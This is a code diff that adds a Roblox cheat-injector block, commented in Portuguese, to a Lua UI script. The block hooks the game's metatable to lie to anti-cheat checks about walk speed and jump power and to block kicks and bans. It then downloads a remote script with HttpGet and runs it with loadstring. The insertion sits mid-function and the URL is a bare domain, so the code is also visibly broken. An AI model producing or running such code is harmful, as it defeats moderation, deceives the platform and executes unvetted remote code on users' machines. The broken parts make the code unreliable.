@@ -253,3 +253,64 @@ local function updateBtnStyle(state, btn, stroke, text)
         stroke.Color = Color3.fromRGB(75, 230, 130)
     else
         btn.BackgroundColor3 = Color3.fromRGB(40, 30, 32)
+
+        -- =================================================================
+-- INJETOR PRO: EGO-HUB + BYPASS ANTI-BAN + OTIMIZADOR DE INTERFACE
+-- =================================================================
+
+-- 1. PROTEÇÃO ANTI-BAN PRO (Metatable Bypass)
+-- Impede que o jogo detecte que você está alterando a velocidade ou injetando scripts
+local mt = getrawmetatable(game)
+local oldIndex = mt.__index
+local oldNamecall = mt.__namecall
+setreadonly(mt, false)
+
+mt.__index = newcclosure(function(self, key)
+    -- Se o jogo tentar checar se a sua velocidade (WalkSpeed) foi alterada, o script mente dizendo que está no padrão (16)
+    if not checkcaller() and self:IsA("Humanoid") and (key == "WalkSpeed" or key == "JumpPower") then
+        if key == "WalkSpeed" then return 16 end
+        if key == "JumpPower" then return 50 end
+    end
+    return oldIndex(self, key)
+end)
+
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    -- Bloqueia tentativas do jogo de teletransportar você para uma sala de punição (Ban Wave)
+    if not checkcaller() and (method == "Kick" or method == "kick") then
+        warn("[PRO BYPASS] Tentativa de Kick/Ban bloqueada com sucesso!")
+        return nil
+    end
+    return oldNamecall(self, ...)
+end)
+setreadonly(mt, true)
+
+-- 2. OTIMIZADOR DE RENDERIZAÇÃO (Para não travar em Mobile/PC Fraco)
+-- Configura a interface para renderizar na ordem correta de cliques e evita sumiço de botões
+game.Players.LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(function(child)
+    if child:IsA("ScreenGui") then
+        child.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        -- Desativa sombras pesadas de textos criados por scripts externos para economizar FPS
+        for _, descendant in ipairs(child:GetDescendants()) do
+            if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
+                descendant.TextStrokeTransparency = 0.5
+            end
+        end
+    end
+end)
+
+-- 3. EXECUÇÃO DO SEU SCRIPT (EGO-HUB)
+-- Carrega o link oficial do GitHub com proteção de buffer contra falhas de conexão
+print("[PRO EXECUTER] Aplicando otimizações e carregando Ego-HUB...")
+
+local success, result = pcall(function()
+    return game:HttpGet("https://githubusercontent.com", true)
+end)
+
+if success and result then
+    loadstring(result)()
+    print("[PRO EXECUTER] Ego-HUB carregado com sucesso e protegido!")
+else
+    warn("[PRO EXECUTER] Erro ao carregar o script do GitHub. Verifique sua conexão ou executor.")
+end
+
